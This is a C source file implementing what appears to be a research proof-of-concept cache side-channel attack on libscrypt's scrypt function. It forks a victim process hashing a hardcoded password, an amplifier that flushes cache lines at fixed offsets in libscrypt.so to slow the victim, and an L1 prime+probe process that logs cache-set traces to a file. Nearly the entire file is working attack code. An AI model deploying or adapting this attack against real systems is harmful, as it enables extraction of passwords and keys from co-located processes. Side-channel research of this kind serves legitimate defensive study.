#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sched.h>
#include <time.h>
#include <util.h>
#include <fcntl.h>
#include <l1.h>
#include <low.h>
#include <sched.h>
#include <semaphore.h>
#include <stdlib.h>
#include <symbol.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include "rdtsc.h"
#include "libscrypt.h"

void print_res(FILE* fp, uint16_t* res, int* rmap, int nsets){
	int i = 0;
	int j = 0;
	for (i = 0; i < 1; i++)
	{
		for (j = 0; j < L1_SETS; j++)
		{
			if (rmap[j] == -1)
				fprintf(fp, "  0 ");
			else
				fprintf(fp, "%3d ", res[i*nsets + rmap[j]]);
		}
		fprintf(fp, "\n");
	}
}

void print_hex(const char *s)
{
  while(*s)
    printf("%02x", (unsigned int) *s++);
  printf("\n");
}

int main(){
    char buff[64];

    int i,j;
    int fd = open("./libscrypt.so", O_RDONLY);
    if(fd == -1){
        perror("Can't open the file, please check\n");
        return 0;
    }
    size_t size = lseek(fd, 0, SEEK_END);
    if(size == 0)
        exit(-1);
    size_t map_size = size;
    if ((map_size & 0xFFF) != 0){
      map_size |= 0xFFF;
      map_size += 1;
    }
    char* base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);

    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(1, &mask);

    if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
        perror("some error occurred while setting the affinity.\n");

    pid_t attacker = getpid();
    printf("attacker id: %d\n", attacker);
    int childid = fork();
    if(childid == 0){ //victim

        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(5, &mask);

        if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
            perror("some error occurred while setting the affinity.\n");
        uint64_t a = rdtsc();
        libscrypt_scrypt((uint8_t*)"4Lex3s8O2zfNgBqH", 16, (uint8_t*)"NaCl", 4, 1024, 8, 16, (uint8_t*)buff, 64);
        printf("%llu\n", rdtsc()-a);
        exit(0);
        /* print_hex(buff); */

    } else {
        printf("victim id: %d\n", childid);
        int cid =fork();
        if(cid == 0){ //amplifier


            cpu_set_t mask;
            CPU_ZERO(&mask);
            CPU_SET(3, &mask);

            if(sched_setaffinity(0, sizeof(mask), &mask) != 0)
                perror("some error occurred while setting the affinity.\n");

            char *monitor[] = {"crypto_scrypt-nosse.c:167","crypto_scrypt-nosse.c:347",
                "crypto_scrypt-nosse.c:378", "crypto_scrypt-nosse.c:88", "crypto_scrypt-nosse.c:101"};
            /* int nmonitor = sizeof(monitor)/sizeof(monitor[0]); */
            uint64_t addresses[] = {0x1132, 0x165c, 0x16b6, 0xfa2, 0x1304};
            for(i=0; i<5; i++){
                /* uint64_t offset = sym_getsymboloffset("~/Desktop/scrypt_test_new/libscrypt/libscrypt.so", monitor[i]); */
                uint64_t offset = addresses[i] + base;
                addresses[i] = offset;
            }

            sem_t *namedSemaphore, *unamedSemaphore;
            if ((namedSemaphore = sem_open("psem", O_CREAT, 0666, 0)) == SEM_FAILED){
                perror("named semaphore initialization error");
                return 0;
            }
            if ((unamedSemaphore = sem_open("usem", O_CREAT, 0666, 0)) == SEM_FAILED){
                perror("named semaphore initialization error");
                return 0;
            }

            sem_wait(namedSemaphore);
            sem_post(unamedSemaphore);

            sem_close(namedSemaphore);
            sem_close(unamedSemaphore);

            sem_unlink("psem");
            sem_unlink("usem");

            int j = 0;
            uint64_t a = rdtsc();
            while(j++ < 1600000){
                for(i=0; i<5; i++)
                    clflush(addresses[i]);
            }
            printf("attacker: %llu\n", rdtsc() - a);
            exit(0);
        } else { //prime + probe
            printf("amplifier id: %d\n", cid);

            for(i=0; i<10000; i++); //to make sure that other threads have been launched
            int k=0,no_of_rounds=300;


            struct l1pp{
                void *memory;
                void *fwdlist;
                void *bkwlist;
                uint8_t monitored[L1_SETS];
                int nsets;
            };

            l1pp_t l1 = l1_prepare();
            int nsets = l1_getmonitoredset(l1, NULL, 0);
            int *map = calloc(nsets, sizeof(int));
            l1_getmonitoredset(l1, map, nsets);

            int rmap[L1_SETS];
            for (i = 0; i < L1_SETS; i++)
                rmap[i] = -1;
            for (i = 0; i < nsets; i++)
                rmap[map[i]] = i;

            /* uint16_t *res = calloc(1*64, sizeof(uint16_t)); */
            uint16_t res[64];
            for(i=0; i<no_of_rounds; i++)
                for(j=0; j<64; j++)
                    res[j] = 0;
            /* for (i = 0; i < 1 * 64; i+= 4096/sizeof(uint16_t)) */
            /*     res[i] = 0; */

            FILE *fp = fopen("cache_traces.txt","w");
            delayloop(3000000000U);


            sem_t *abarrierSemaphore, *bbarrierSemaphore;
            if ((abarrierSemaphore = sem_open("arr", O_CREAT, 0666, 0)) == SEM_FAILED){
                perror("named semaphore initialization error");
                return 0;
            }
            if ((bbarrierSemaphore = sem_open("brr", O_CREAT, 0666, 0)) == SEM_FAILED){
                perror("named semaphore initialization error");
                return 0;
            }

            sem_wait(abarrierSemaphore);
            for(i=0; i<3; i++)
                l1_bprobe(l1, res);
            sem_post(bbarrierSemaphore);


            k = 0;
            while(k<no_of_rounds){
                sem_wait(abarrierSemaphore);
                    l1_probe(l1, res);
                    /* printf("client: %d\n",k); */
                sem_post(bbarrierSemaphore);

                sem_wait(abarrierSemaphore);
                    l1_bprobe(l1, res);
                sem_post(bbarrierSemaphore);

                print_res(fp, res, rmap, nsets);
                k++;
            }
            sem_close(abarrierSemaphore);
            sem_close(bbarrierSemaphore);

            sem_unlink("arr");
            sem_unlink("brr");


            fclose(fp);
        }

        wait(NULL);
        wait(NULL);
        exit(0);
    }
    return 0;
}

